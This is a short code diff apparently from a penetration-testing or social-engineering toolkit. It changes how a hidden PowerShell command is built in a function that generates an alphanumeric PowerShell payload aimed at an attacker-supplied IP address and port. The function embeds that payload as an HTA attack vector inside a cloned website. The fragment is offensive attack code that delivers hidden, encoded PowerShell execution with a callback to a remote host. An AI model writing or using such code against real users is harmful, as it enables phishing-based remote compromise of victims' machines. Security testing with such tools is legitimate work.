@@ -33,7 +33,7 @@ def gen_hta_cool_stuff():
         "Generating powershell injection code and x86 downgrade attack...")
     ps = generate_powershell_alphanumeric_payload(
         selection, ipaddr, port, "x86")
-    command = ("powershell -window hidden -EncodedCommand " + ps)
+    command = ("powershell -window hidden -e " + ps)
     # hta code here
     print_status("Embedding HTA attack vector and PowerShell injection...")
     # grab cloned website
